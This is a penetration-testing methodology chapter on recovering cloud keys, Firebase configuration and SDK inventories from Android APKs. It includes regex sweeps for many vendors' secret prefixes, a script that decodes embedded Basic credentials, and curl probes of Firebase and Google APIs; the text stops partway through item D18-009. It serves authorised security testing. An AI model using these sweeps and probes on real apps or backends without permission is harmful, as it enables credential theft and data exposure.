# D18 · Cloud Backend & Third-Party SDK Configuration

> The APK is where the backend's identity lives, not where the bug lives. Everything in the package is public by design; the finding is always what an extracted identifier *reaches* — and that reach is rated on the server side, which is why this is the only domain in a mobile engagement that routinely lands P1 while the entire mobile branch of the VRT is capped at P5.

| | |
|---|---|
| **Phases** | P3 static inventory & config extraction, P6 runtime SDK traffic and consent |
| **Milestones** | M3 (backend identity table complete, every key restriction-verified), M6 (SDK data-flow map and cloud data-plane verdicts recorded, positive and negative) |
| **VRT ceiling** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) and `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1); `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` is VARIES and is rated on demonstrated data impact |
| **Primary attacker model** | AM-01 remote, no interaction, no device (a plain `curl` from the tester's own host). AM-08 malicious third-party SDK for the in-process items; AM-09 malicious backend/CDN for the config-channel items |
| **Maps to** | MASVS-STORAGE-1, MASVS-PRIVACY-1/-3/-4, MASVS-CODE, MASVS-CRYPTO; MASTG-TEST-0318, MASTG-TEST-0319, MASTG-TEST-0206, MASTG-KNOW-0039, MASTG-KNOW-0026, MASTG-TECH-0007, MASTG-TECH-0019, MASTG-TECH-0033, MASTG-TECH-0043, MASTG-TECH-0100, MASTG-TOOL-0125, MASTG-TOOL-0144, MASTG-TOOL-0134, MASTG-TOOL-0131; MASWE-0004, MASWE-0044, MASWE-0069, MASWE-0073, MASWE-0078; CWE-798, CWE-306, CWE-200, CWE-359, CWE-358; OWASP Mobile Top 10 2024 M2/M6/M8/M9; OWASP API Security Top 10 2023 API1/API2/API5/API8/API10; ATT&CK T1481.002, T1437.001, T1474.001, T1533, T1532, T1646, T1430.001 |

## Why this domain pays

It pays because the severity is decided on a server that is in scope, by an attacker model with no preconditions at all. A Firebase Realtime Database that answers `GET /.json` is read by anyone on the internet who has done nothing more than download a free app from Google Play — no device, no root, no proximity, no user interaction, no installed malicious app. Contrast the rest of the mobile surface, where the best exported-component finding still has to argue that a victim installed the attacker's app. Bugcrowd's VRT reflects this asymmetry exactly: the whole `mobile_security_misconfiguration` branch is P5, while `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` is P1 and `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` is P1. The corpus's disclosed-report base rate says the same thing from the other direction: the Firebase open-database finding is the single most repeated mobile-recon finding in the HackerOne set (Zego #1065134 High 7.5, Periscope #684099 Critical, MTN #1447751 / #1351326 / #1351329 / #1691888, MobiSystems #731724 for the Firestore variant), and the FCM server-key class alone earned one researcher a reported $30,000+ in aggregate across programs.

It also pays *badly* if you skip one step. The same grep that finds a P1 finds a P5 far more often. `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` is P5, and a Firebase Web API key, a Stripe publishable key, a correctly package-restricted Maps key and an analytics ingest key all live there. Reddit explicitly excludes Firebase keys as hardcoded secrets; Basecamp excludes hardcoded keys outright "unless chained with a demonstrated cross-user impact that does not require physical device access"; YesWeHack's Gojek program lists "non important secrets (such as 3rd party secrets)" as non-qualifying. So the restriction-verification gate in this chapter (D18-009 through D18-013) is not procedural politeness — it is the entire difference between the ceiling and the graveyard, and it costs one HTTP request per key.

The third reason it pays is that almost nobody on the client side owns it. The backend team wrote the rules; the mobile team shipped the config; the SDK vendor shipped a manifest entry that merged into the app without anyone reading it. Oversecured's SDK research and the EngageLab EngageSDK case (≤ v4.5.4, fixed in 5.2.1 on 2025-11-03, apps with 50M+ combined installs) exist precisely in that seam. The corpus is blunt that this is "the highest £/hour class in mobile — and it is not a *mobile* bug at all; the APK is just where the config lives."

## The crux question

For every backend identity the package contains — project id, bucket, identity-pool id, anon key, vendor API key — does it still do anything when it is used from a host that is not the app, by an identity that is not a legitimate user?

## Applicability probe

D18 has two halves. The cloud/backend-identity half (D18-001..-055, -068..-077) applies to any app that names a cloud project, bucket, BaaS or vendor key anywhere in the package; the SDK half (D18-056..-067) applies to any app that bundles a third-party SDK. Both are nearly always true, so the probe decides *which blocks* are n/a far more often than the whole domain. Run it against `$DEC` once, record the five counts, and write the block-level notes it produces.

```bash
MF=$DEC/apktool/AndroidManifest.xml; R=$DEC/apktool/res; A=$DEC/apktool/assets; S=$DEC/jadx/sources
# 1. Google/Firebase project present? (strings written by the google-services plugin) and which Firebase SDKs actually have a consumer (registrars)
grep -cE 'google_app_id|google_api_key|firebase_database_url|google_storage_bucket|project_id' "$R/values/strings.xml"
grep -oE 'com\.google\.firebase\.components:[A-Za-z0-9_.$]+' "$MF" | sed 's/.*://' | sort -u
# 2. any cloud / BaaS / function host or identity-pool id anywhere in the package, native blobs and bundles included
grep -rhoE '[a-z0-9.-]+\.(amazonaws\.com|blob\.core\.windows\.net|storage\.googleapis\.com|firebaseio\.com|firebasedatabase\.app|appspot\.com|firebasestorage\.app|supabase\.co|cloudfunctions\.net|run\.app|back4app\.com|parseapi\.[a-z.]+|data\.mongodb-api\.com)|[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}' "$DEC" | sort -u | tee inventory/cloud-hosts.txt | wc -l
# 3. vendor-key prefix hits (the D18-004 set, counted — the sweep itself runs in D18-004)
grep -rhoE 'AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[A-Za-z0-9]{16,}|da2-[a-z0-9]{26}|mob-[0-9a-f-]{36}|os_v2_app_[a-z0-9_]{40,}|DefaultEndpointsProtocol=|"type": *"service_account"' "$DEC" | sort -u | wc -l
# 4. third-party SDK inventory: manifest components outside the app's own package, and dex package prefixes
PKG=$(grep -oE 'package="[^"]+"' "$MF" | head -1 | cut -d'"' -f2)
grep -oE 'android:name="[a-z]+\.[A-Za-z0-9_.]+"' "$MF" | cut -d'"' -f2 | grep -v "^$PKG" | awk -F. '{print $1"."$2"."$3}' | sort -u | tee inventory/sdk-prefixes.txt | wc -l
# 5. the runtime-SDK block needs a device + proxy: record lab.mode (device/mitm/frida) from scripts/doctor.sh --json
```

Decision rules:
- Probe 1 > 0 **or** any registrar listed → the `firebase` block (D18-001, -009..-034, -075) applies. The registrar list decides which data-plane items have a *consumer*; probe them regardless (they are internet-reachable) and record the consumer status in the identity table.
- Probe 2 > 0 or probe 3 > 0 → the cloud-credential block (D18-002..-013, -035..-050, -055, -068, -073, -074, -076, -077) applies to the hosts and keys listed; each sub-block (AWS, Azure, BaaS, payments, media, search, push, flags) is n/a when no host/key of that class is in `inventory/cloud-hosts.txt` or the prefix count — name the class and the empty grep in the note.
- Probe 4 > 0 → the SDK block (D18-006, -008, -046, -051..-054, -056..-067) applies; the vendor-specific rows (session replay -059, support chat -052..-054, attribution -062/-063, ads -064, identity verification -051, payments -047/-048) are n/a when `inventory/sdk-prefixes.txt` holds no prefix of that vendor class — paste the prefix list in the note.
- Probe 5: with no device or no proxy, D18-057..-061, -065 are `blocked` (not n/a) with the missing capability named.
- D18-069..-072 (gates) always apply to any probe issued anywhere in the engagement.

Whole-domain n/a note (rare — only when every count is zero):

`D18 n/a — no Google/Firebase strings or registrars (probe 1: 0 strings, no registrar), no cloud/BaaS/function host or identity-pool id in the full decompiled tree including lib/ and bundles (probe 2: 0; inventory/cloud-hosts.txt empty), no vendor-key prefix hit (probe 3: 0), and every manifest component is in the app's own package (probe 4: 0; inventory/sdk-prefixes.txt empty). Commands and counts as run against $DEC on <date>. D18-069..072 still apply to probes issued in other domains.`

Block-level n/a note template:

`D18-<item range> n/a — <block name>: probe <n> returned 0 on $DEC (<command pasted>, count 0) and backend-identity.md has no row of kind <kind>; consumer check (registrar list / sdk-prefixes.txt) pasted.`

## Triage order

1. **Extract the full backend-identity table first (D18-001 to D18-008).** Every later probe is parameterised by it, and half of it is not in `strings.xml` — it is in `assets/`, in `libapp.so`, in the JS bundle.
2. **Run the restriction gate on every key before touching anything else (D18-009 to D18-013).** One request per key. It decides P1 versus P5 and stops you from writing a report that gets closed as "public by design".
3. **Firebase Storage bucket listing (D18-021).** Cheapest high-signal probe in the domain: one unauthenticated `GET`, and a returned object list *is* the finding.
4. **RTDB and Firestore reads (D18-014, D18-017).** Second cheapest, highest disclosed-report base rate, and the read result immediately tells you whether the write test is worth running.
5. **The `request.auth != null` rule plus self-enrolment (D18-019, D18-020).** More common than fully open rules and strictly more serious, because it looks closed to a casual probe. This is the one a scanner never finds.
6. **Cloud-credential scope checks (D18-035, D18-036, D18-038).** `sts get-caller-identity` is one call, non-mutating, and resolves a P1/nothing question immediately.
7. **Object storage listing and write (D18-039, D18-040).** Writable beats readable by a full severity band; test both, always.
8. **Vendor keys with a *read* API (D18-046 to D18-050).** Teams paste the management key where the ingest key belonged; the vendor's read endpoint is where you find out.
9. **Cloud Functions and BaaS endpoints (D18-027, D18-044).** Admin-SDK code inside a callable ignores every security rule you just tested, so a hardened rules set means nothing here.
10. **Remote Config and App Check (D18-023 to D18-026, D18-029).** Config leaks unreleased endpoints that feed D15, and App Check absence is the sentence that turns "on-device only" into "remote".
11. **Support/chat and identity-verification SDKs (D18-051 to D18-054).** Under-tested, and support threads carry recovery correspondence.
12. **Runtime SDK data flows and consent (D18-056 to D18-065).** These need a proxy and a device, so they come last; they are also where the privacy-band rating applies, which is materially lower at most vendors.
13. **Discipline items (D18-068 to D18-072).** Run them continuously, not at the end.

## Items

### D18-001 · Recover the Google Services configuration from compiled resources, not from `google-services.json`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` (P5) — this item is recon, never a report |
| **Attacker** | AM-01 |
| **Applies to** | All apps with a Firebase or Google Cloud SDK |
| **Requires** | firebase |
| **Maps to** | MASTG-TECH-0007, MASTG-TECH-0019, MASTG-KNOW-0039, API8:2023 |

- **Test:** The Gradle Google Services plugin compiles `google-services.json` into string resources at build time, so the file itself is usually absent from the APK. Recover the project id, API key, database URL, storage bucket, app id and sender id from `res/values/strings.xml` instead.
- **How:**
```bash
grep -nE 'google_app_id|google_api_key|firebase_database_url|google_storage_bucket|project_id|gcm_defaultSenderId|default_web_client_id|firebase_url|mobilesdk_app_id' \
  $R/values/strings.xml
# some builds do still ship the raw file
unzip -l target.apk | grep -iE 'google-services|firebase|GoogleService'
unzip -p target.apk res/raw/google-services.json 2>/dev/null | python3 -m json.tool
# which Firebase SDKs are actually compiled in: the ComponentDiscoveryService registrar list in the merged manifest.
# firebase_database_url / google_storage_bucket are written by the google-services plugin whether or not the client is present
grep -oE 'com\.google\.firebase\.components:[A-Za-z0-9_.$]+' "$MF" | sed 's/.*://' | sort -u
# …database.DatabaseRegistrar = RTDB client; …storage.StorageRegistrar = Storage; …firestore.FirestoreRegistrar; …remoteconfig.RemoteConfigRegistrar; …auth.FirebaseAuthRegistrar; …messaging.FirebaseMessagingRegistrar
find "$DEC" -name 'google-services.json' -exec python3 -m json.tool {} \;
```
- **Proof:** The six values recorded with `file:line`, then one live request against the project confirming they are current rather than a stale copy. For each data-plane identifier state whether a *consumer* exists (registrar present). A store with no consumer is still probed — it is internet-reachable regardless — but the report says the app never reads it: the finding is the project's exposure, not this app's data flow.
- **Escalation:** Parameterises D18-014 through D18-030 and every Storage/Functions probe. Leaked internal hostnames feed -> D15 API testing.
- **Ruled out when:** No `com.google.gms.google-services` artefacts exist anywhere in the package — no `google_app_id` string, no `com.google.firebase` classes in the dex, no `firebase` entries in the merged manifest — so the app has no Google/Firebase project to address. Record the three negative greps; "MobSF found no Firebase" is not a ruled-out entry.

### D18-002 · Sweep `assets/`, `res/raw/`, `META-INF/` and `.properties` for the config the `strings.xml` grep misses

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the recovered material is a live server credential |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Requires** | — |
| **Maps to** | MASWE-0004 (CWE-798), MASTG-TECH-0007 ("it is normally worth taking a look at the rest of the resources and files… sometimes they contain additional goodies like key stores, encrypted databases, certificates") |

- **Test:** Client keys live in `strings.xml`; genuine server-side credentials live in `assets/`, in bundled `.properties` files, in `awsconfiguration.json` / `amplifyconfiguration.json`, and in stray `.pem` / `.p12` / service-account JSON.
- **How:**
```bash
grep -rniE 'BEGIN (RSA|EC|DSA|OPENSSH|PRIVATE) KEY|-----BEGIN|aws_secret|client_secret|key_secret|private_key' \
  $A/ $R/ $DEC/apktool/unknown/ 2>/dev/null
grep -rniE 'password|passwd|Basic [A-Za-z0-9+/=]{16,}' $A/*.properties 2>/dev/null
grep -rn '"type": *"service_account"' $A $R 2>/dev/null
find out -iname 'aws*config*' -o -iname 'amplifyconfiguration.json' -o -iname '*.p12' \
     -o -iname '*.jks' -o -iname '*.bks' -o -iname '*.pem' -o -iname '*.plist'
unzip -l target.apk | grep -iE '\.json$' | grep -iE 'service|account|credential|firebase-adminsdk'
```
- **Proof:** The literal secret with its path, **plus** the code path that uses it and the host it authenticates to. A secret with no consumer is a weaker report than the same secret with the `Retrofit` interface that sends it.
- **Escalation:** A service-account JSON is a direct -> D18-032 finding; a bundled keystore feeds -> D12 crypto; an `amplifyconfiguration.json` feeds -> D18-036.
- **Ruled out when:** `assets/` contains only fonts, images, licence files and framework bundles, and every `.properties` file is a build-metadata stub (`version.properties`-shaped, no key/secret/password field). List the asset inventory in the negative.

### D18-003 · Pull keys out of native libraries and cross-platform bundles, where DEX-and-resource scanners do not look

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Flutter, React Native (Hermes), Unity IL2CPP/Mono, Xamarin/.NET MAUI, Kotlin Multiplatform, and any app with a custom `.so` |
| **Requires** | — |
| **Maps to** | MASTG-TOOL-0144 (gitleaks), MASTG-TOOL-0125 (Apkleaks), MASTG-TECH-0019 |

- **Test:** MobSF-class scanners parse DEX and resources. For cross-platform apps the backend config is in `libapp.so`, `global-metadata.dat`, `index.android.bundle` or a `.dll`, so the automated scan returns clean on a vulnerable app.
- **How:**
```bash
# native libraries (all ABIs)
for so in $L/*/*.so; do strings -n 8 "$so" | \
  grep -aoE 'AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|[a-z0-9-]+\.firebaseio\.com|[a-z0-9-]+\.supabase\.co|https?://[a-z0-9.-]+\.(amazonaws|googleapis|blob\.core\.windows)\.[a-z.]+'; done | sort -u
# Flutter
strings -n 8 $L/arm64-v8a/libapp.so > libapp.strings
grep -aoE 'package:[a-z0-9_]+/' libapp.strings | sort -u
# React Native / Hermes
strings -n 6 $A/index.android.bundle | \
  grep -aEi 'AIza[0-9A-Za-z_-]{35}|api\.|graphql|/v1/|wss://|sentry\.io|bugsnag|appcenter|codepush|firebaseio\.com|amplify|aws'
# Unity IL2CPP — Il2CppDumper stringliteral.json holds every string literal
grep -a 'stringliteral' $DEC/il2cpp/stringliteral.json | head
# Xamarin/MAUI — unpack assemblies then decompile
ilspycmd $DEC/assemblies/out/App.dll | grep -nE 'AIza|AKIA|sk_live|apikey|Bearer'
# Cordova/Ionic/Capacitor web assets
grep -rniE 'api[_-]?key|secret|token|password|firebase|amazonaws|sentry' $A/www $A/public 2>/dev/null
```
- **Proof:** A validated key present **only** in the native blob or bundle, with the extraction command and the offset/file recorded so the client can find it in their build.
- **Escalation:** Feeds the restriction gate (D18-009) and every vendor probe; also a -> D19 cross-platform finding if the framework layer is the only place the config exists.
- **Ruled out when:** The app ships no cross-platform runtime and every `.so` is a known third-party library whose strings contain no host, no key-shaped literal and no credential (record the ABI list and the per-library grep result).

### D18-004 · The high-signal secret-prefix sweep, run with result counting

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a live infra credential; `…intentionally_public_sample_or_invalid` (P5) otherwise |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Requires** | — |
| **Maps to** | MASWE-0004 (CWE-798), MASTG-TOOL-0144, MASTG-TOOL-0125 |

- **Test:** Word-grep produces noise; vendor prefixes do not. The corpus's explicit anti-pattern is "don't grep only for `password`". Sweep the prefix set across the whole decompiled tree, then count what you got.
- **How:**
```bash
S=$DEC/jadx/sources; R=$DEC/apktool/res; A=$DEC/apktool/assets   # the P2 tree (START.md §6); D18-005 sets L and MF too
grep -rhoE 'AKIA[A-Z0-9]{16}'                              $S $R $A   # AWS access key id
grep -rhoE 'ASIA[A-Z0-9]{16}'                              $S $R $A   # AWS temporary
grep -rhoE 'aws_secret_access_key["[:space:]:=]+[A-Za-z0-9/+=]{40}' $S $R $A
grep -rhoE 'AIza[A-Za-z0-9_-]{35}'                         $S $R $A   # Google API key
grep -rhoE 'ya29\.[A-Za-z0-9_-]+'                          $S $R $A   # Google OAuth ACCESS token (short-lived; proves a token was embedded or logged)
grep -rhoE '1//0[A-Za-z0-9_-]{40,}'                        $S $R $A   # Google OAuth REFRESH token (persistent)
grep -rhoE 'github_pat_[A-Za-z0-9_]{80,}|gh[pousr]_[A-Za-z0-9]{36}' $S $R $A   # GitHub PATs incl. fine-grained
grep -rhoE 'glpat-[A-Za-z0-9_-]{20}'                       $S $R $A   # GitLab PAT
grep -rhoE 'xox[pbar]-[A-Za-z0-9-]+'                       $S $R $A   # Slack
grep -rhoE 'sk-(proj|svcacct|admin)-[A-Za-z0-9_-]{40,}|sk-[A-Za-z0-9]{48}' $S $R $A   # OpenAI, 2024+ and legacy formats
grep -rhoE 'sk-ant-[A-Za-z0-9_-]{90,}'                     $S $R $A   # Anthropic
grep -rhoE 'AC[a-f0-9]{32}'                                $S $R $A   # Twilio account SID
grep -rhoE 'sk_live_[A-Za-z0-9]{24}'                       $S $R $A   # Stripe live secret
grep -rhoE 'rk_live_[A-Za-z0-9]{20,}'                      $S $R $A   # Stripe restricted
grep -rhoE 'rzp_(live|test)_[A-Za-z0-9]{14}'               $S $R $A   # Razorpay
grep -rhoE 'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'      $S $R $A   # SendGrid
grep -rhoE 'cloudinary://[0-9]+:[A-Za-z0-9_-]+@[a-z0-9-]+' $S $R $A   # Cloudinary
grep -rhoE 'client_secret["[:space:]:=]+[A-Za-z0-9_-]{24,}' $S $R $A
grep -rhoE 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)[0-9.]+(:[0-9]+)?[a-zA-Z0-9./_?=&-]*' $S $R $A
# HTTP Basic literals anywhere in sources/res/assets, decoded; a user:password with a 20+ char password is a credential, not a sample
grep -rhoE 'Basic [A-Za-z0-9+/=]{12,}' $S $R $A | sort -u > basic_literals.txt; wc -l basic_literals.txt
python3 - <<'PY'
import base64
for l in open('basic_literals.txt'):
    tok = l.split()[1]
    try: print(tok[:12], '->', base64.b64decode(tok + '=' * (-len(tok) % 4)).decode('utf-8', 'replace')[:80])
    except Exception as e: print(tok[:12], 'ERR', e)
PY
grep -rnE 'Credentials\.basic\(|"Authorization", *"Basic |Proxy-Authorization' $S | head        # the consumer: which host receives it
# tool cross-check — each tool must pass a positive control on THIS tree before its empty result counts
printf '<string name="pc">AIzaSyA-positive-control-0123456789abcdefg</string>\n' > "$R/values/zz_positive_control.xml"
trufflehog filesystem "$DEC" --no-verification --json > trufflehog.json   # --no-verification: the tool must never call the vendor with a live key — D18-009 does that under your control
grep -c 'positive-control' trufflehog.json                                 # must be >=1 or the tool is blind on this tree
gitleaks dir "$DEC/apktool" --report-path gitleaks.json                    # ONE path per invocation: several paths silently scan 0 bytes
grep -c 'positive-control' gitleaks.json                                   # gitleaks <=8.30 misses AIza keys inside XML (>AIza…<): expect 0 and record that it failed its control
rm "$R/values/zz_positive_control.xml"
apkleaks -f target.apk -o apkleaks.json --json                             # runs its own jadx pass (15–20 min on a 200 MB base): run ONCE, reuse in D18-046
```
- **Proof:** A deduplicated candidate table with `file:line` for each hit, **and a count**: number of candidates found, number validated live, number restricted. Anything you did not validate is explicitly marked unvalidated. Pre-filter apkleaks' known-noise buckets before counting (`JSON_Web_Token` = public-suffix/TLD lists, `Facebook_Secret_Key` = any 32-hex string, `Google_API_Key` = D18-001's resource keys already in the table). A key already probed in D18-009 is cited from that row, never re-probed — every probe is a request logged on the vendor's project. Each decoded Basic credential gets a row in the identity table with its consumer host; validate per D18-013 with ONE benign request to that host only.
- **Escalation:** Every candidate enters the restriction gate (D18-009) and, if live, the scope enumeration for its vendor.
- **Ruled out when:** Zero prefix matches across DEX, resources, assets and every `.so`/bundle (D18-003 run first), the Basic-literal pass is empty, and two independent tools that each PASSED a positive control on this tree return empty. A tool that failed its control does not count toward the two; the prefix sweep is primary, tools are the cross-check. Cross-reference: D26-024 holds the tool recipe and D01-064 the every-split rule — cite them rather than re-running.

### D18-005 · Build the backend-identity table before issuing any probe

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — methodology artefact |
| **Attacker** | n/a |
| **Applies to** | All |
| **Requires** | — |
| **Maps to** | MASTG-TECH-0007, MASTG-TECH-0019 |

- **Test:** Every item below is parameterised by a small set of identifiers. Collect them once, in one file, with provenance, so that a probe result can always be traced back to where the identifier came from — and so the ruled-out register has something to point at.
- **How:** Set the decompiled-tree variables once per shell — every How in this chapter uses them, and `$DEC` is the
  P2 decompilation per START.md §6 (never re-run apktool/jadx here):
```bash
S=$DEC/jadx/sources; R=$DEC/apktool/res; A=$DEC/apktool/assets; L=$DEC/apktool/lib; MF=$DEC/apktool/AndroidManifest.xml
```
  Produce `backend-identity.md` with one row per identifier: `value | kind | source file:line | vendor | restriction verdict | probe result | date`. Kinds to fill: `project_id`, `google_api_key`, `google_app_id`, `gcm_defaultSenderId`, `firebase_database_url`, `storage_bucket`, `cognito_identity_pool`, `cognito_user_pool`, `supabase_ref` + `anon_key`, `appsync_endpoint` + `api_key`, every `*.s3*.amazonaws.com` / `storage.googleapis.com/*` / `*.blob.core.windows.net` host, every `*.cloudfunctions.net` / `*-lambda-url.*` / `*.execute-api.*` / `*.run.app` host, and every vendor key with its vendor name.
```bash
grep -rhoE '[a-z0-9.-]+\.(s3[.-][a-z0-9-]*\.amazonaws|blob\.core\.windows|storage\.googleapis|firebaseio|firebasedatabase\.app|appspot|supabase|cloudfunctions|run\.app)\.[a-z.]*' "$DEC" | sort -u > hosts.txt
grep -rhoE 'us-[a-z]+-[0-9]:[0-9a-f-]{36}' "$DEC" | sort -u >> hosts.txt   # Cognito identity pool ids
wc -l hosts.txt
```
- **Proof:** The populated table. Every later item's "ruled out when" cites a row of it.
- **Escalation:** Hand the same table to -> D01 (attack-surface map) and -> D15 (API testing); the function/lambda hosts are D15's starting endpoint list.
- **Ruled out when:** Not applicable — this is an artefact, not a test. It is "done" when every identifier in `hosts.txt` and every key from D18-004 has a row with a non-empty restriction verdict.

### D18-006 · Reconstruct the SDK inventory from the merged manifest

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) once a specific component is shown reachable; the inventory alone is P5 |
| **Attacker** | AM-03 for the components it reveals |
| **Applies to** | All |
| **Requires** | — |
| **Maps to** | MASWE-0044, MASTG-KNOW-0026; `developer.android.com/privacy-and-security/risks/insecure-library` |

- **Test:** In a stripped, R8-renamed APK the merged manifest is the only reliable SDK list: providers, services, receivers and permissions injected by AARs name their vendors even when every class has been renamed. Each third-party component is an exported surface the first-party team has never reviewed.
- **How:**
```bash
xmllint --format "$MF" > merged.xml
grep -oE 'android:name="[a-z]+\.[a-zA-Z0-9_.]+"' merged.xml | cut -d'"' -f2 \
  | awk -F. '{print $1"."$2"."$3}' | sort | uniq -c | sort -rn | head -40
# every non-first-party component and its export state, with the declaring package
python3 - <<'PY'
import xml.dom.minidom as m
d = m.parse('$MF')
pkg = d.documentElement.getAttribute('package')
for tag in ('activity','activity-alias','service','receiver','provider'):
    for c in d.getElementsByTagName(tag):
        n = c.getAttribute('android:name')
        if not n.startswith(pkg) and not n.startswith('.'):
            print(f"{tag:9} exported={c.getAttribute('android:exported') or '<unset>':7} "
                  f"perm={c.getAttribute('android:permission') or 'NONE':40} {n}")
PY
# if you have the build tree, the merger report attributes each entry to its AAR
grep -nE 'ADDED from|MERGED from' app/build/outputs/logs/manifest-merger-release-report.txt
```
- **Proof:** The attributed component table, with `exported` state and guarding permission for each third-party entry.
- **Escalation:** Each reachable third-party component goes to -> D04/D05/D06/D07 as a first-class target, and comes back here for the ownership proof in D18-067.
- **Ruled out when:** Every component in the merged manifest is in the app's own package namespace, or every third-party component is `exported="false"` **and** not `grantUriPermissions="true"` (a non-exported provider with URI grants is still reachable by redirection — see D07). Note the `targetSdk` gate: below **targetSdk 31**, a component carrying an intent-filter with no explicit `android:exported` is exported by default, so `<unset>` in the table means exported on those builds.

### D18-007 · Test the key against older published versions of the APK, not just the current one

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the old key is still live |
| **Attacker** | AM-01 |
| **Applies to** | All apps with public release history (Play, APK mirrors, the vendor's own download page) |
| **Requires** | — |
| **Maps to** | Google ASI campaign "Exposed Firebase Cloud Messaging Server Keys" (started 2021-10-12) |

- **Test:** Google's own remediation guidance for exposed FCM keys states that removing the key from the app does not fix it, because "an attacker can simply find the key in an older version". The same is true of every credential class here. A clean current build does not mean a clean project.
- **How:**
```bash
# collect the version set you legitimately have access to, then sweep all of them at once
for f in apks/*.apk; do
  java -jar apktool.jar d -f "$f" -o "decomp/$(basename "$f" .apk)/" >/dev/null 2>&1
done
grep -rhoE 'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{100,}|AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}' decomp/ | sort -u > allkeys.txt
wc -l allkeys.txt
diff <(grep -rhoE 'AIza[0-9A-Za-z_-]{35}' decomp/current/ | sort -u) \
     <(grep -rhoE 'AIza[0-9A-Za-z_-]{35}' decomp/old/     | sort -u)
```
  Then run the restriction gate (D18-009) against the keys that appear **only** in old builds.
- **Proof:** A key absent from the current build, present in a named older version, and still returning a successful response from the vendor API today. State the old version code and where you obtained the artefact.
- **Escalation:** Turns a "we already rotated that" response into a live finding; report it as a rotation-failure with the vendor console step the client must take.
- **Ruled out when:** Every key found in an older build either fails authentication now (record the vendor's exact error) or is identical to a key in the current build that has already been ruled restricted. Also ruled out when the engagement brief limits you to the current build — say so rather than implying you tested history.

### D18-008 · Fingerprint SDK versions under R8 using string, resource and JNI anchors

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `using_components_with_known_vulnerabilities.outdated_software_version` (P5) on its own — the finding is always the reachable defect |
| **Attacker** | n/a |
| **Applies to** | R8/ProGuard-obfuscated release builds, i.e. most of them |
| **Requires** | — |
| **Maps to** | MASWE-0044, MASTG-TOOL-0134 (cdxgen), MASTG-TOOL-0131 (dependency-check) |

- **Test:** With classes renamed, grepping for `com.vendor.Sdk` fails. R8 does not rename string constants, resource identifiers or JNI export symbols — anchor on those, then hook the obfuscated name you found.
- **How:**
```bash
# anchor 1: version metadata the build leaves behind
unzip -l target.apk | grep -iE 'META-INF/.*\.version|\.properties$'
unzip -p target.apk META-INF/com.google.android.play_play-core.version 2>/dev/null
# anchor 2: string constants the SDK sends or logs
grep -rn '"n_intent_uri"\|"restoreId"\|"af_dp"\|"~referring_link"\|"user_hash"' $S/
# anchor 3: resource ids and prefixes (never renamed)
grep -rn 'R.string\.\|R.layout\.' $S/ | grep -iE 'zendesk|intercom|braze|clevertap|engage|crop'
grep -rn 'zui_\|intercom_\|com_appboy\|ct_\|branch_' $R/values/*.xml | head
# anchor 4: JNI exports
nm -D --defined-only $L/arm64-v8a/*.so | grep ' T Java_'
# SBOM if the build ships one
cdxgen -t android -o sbom.json target.apk
dependency-check --scan "$DEC" --format JSON
```
- **Proof:** An obfuscated class tied to a named SDK and version by at least two independent anchors, then a Frida hook on the obfuscated name showing the SDK's expected behaviour.
- **Escalation:** Feeds -> D17 supply chain and D18-067; a named version with a vendor advisory converts an SDK finding into one with a concrete remediation, which materially raises the payout odds.
- **Ruled out when:** The build is not obfuscated (class names are intact), or no anchor resolves to a third-party SDK. Do not claim a version from a single `.properties` file that the build script could have staled — two anchors or the version is "unconfirmed".

### D18-009 · MANDATORY GATE — verify Google/Firebase API-key restriction precisely, and learn the three distinct responses

| | |
|---|---|
| **Severity ceiling** | Support (it is a gate); it *determines* whether the downstream item is P1 or P5 |
| **VRT** | decides between `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) and `…intentionally_public_sample_or_invalid` (P5) |
| **Attacker** | AM-01 |
| **Applies to** | Every `AIza…` key recovered from the package |
| **Requires** | — |
| **Maps to** | Google Cloud API key documentation (Android application restriction, API restrictions); `developers.google.com/maps/api-security-best-practices` |

- **Test:** Never report "hardcoded API key". Report what the key does from a host that is not the app. There are three distinct responses and they mean three different things — collapsing them is the most common way a D18 report dies.
- **How:**
```bash
K=AIzaSy...
[ "${#K}" -eq 39 ] || echo "WARN: key is ${#K} chars, not 39 — re-extract from file:line; a truncated key returns API_KEY_INVALID and reads as dead"
probe(){ curl -s "$1" | jq -r '[.error.status, (.error.details[]?.reason // empty), .error.message // .status] | map(select(.!=null)) | join(" | ")'; }
probe "https://identitytoolkit.googleapis.com/v1/projects?key=$K"                        # (a) app-restriction oracle
probe "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K"          # (b) billable web service
curl -s "https://<project>-default-rtdb.firebaseio.com/.json?shallow=true" -w '\nHTTP %{http_code}\n'   # (c) data plane, key-independent
```
